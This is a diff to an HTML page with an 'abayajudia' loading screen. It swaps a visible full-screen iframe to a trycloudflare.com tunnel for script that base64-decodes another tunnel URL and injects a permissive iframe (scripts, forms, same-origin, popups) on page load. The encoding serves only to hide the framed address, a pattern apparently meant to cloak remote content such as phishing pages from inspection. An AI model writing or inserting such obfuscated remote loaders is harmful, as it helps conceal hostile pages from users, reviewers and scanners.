@@ -76,7 +76,7 @@
             transform: translateZ(0);
         }
 
-        iframe {
+        .dynamic-frame {
             width: 100%;
             height: 100%;
             border: none;
@@ -95,17 +95,29 @@
         <div class="brand-loading">abayajudia</div>
     </div>
 
-    <div class="viewport-container" id="viewportContainer">
-        <iframe 
-            id="contentFrame"
-            src="https://norm-submitting-discuss-gis.trycloudflare.com" 
-            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-presentation"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-            onload="hideLoader()">
-        </iframe>
-    </div>
+    <div class="viewport-container" id="viewportContainer"></div>
 
     <script>
+        (function() {
+            var encodedSource = "aHR0cHM6Ly9pbnRlbnNpdmUtcHJvc3BlY3RzLWNvbW11bmljYXRlLW9vcHMudHJ5Y2xvdWRmbGFyZS5jb20=";
+            var decodedUrl = atob(encodedSource);
+
+            var container = document.getElementById('viewportContainer');
+            var iframe = document.createElement('iframe');
+            
+            iframe.id = 'contentFrame';
+            iframe.className = 'dynamic-frame';
+            iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-presentation');
+            iframe.setAttribute('allow', 'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture');
+            
+            iframe.onload = function() {
+                hideLoader();
+            };
+
+            iframe.src = decodedUrl;
+            container.appendChild(iframe);
+        })();
+
         function hideLoader() {
             const loader = document.getElementById('loader');
             if (loader) {
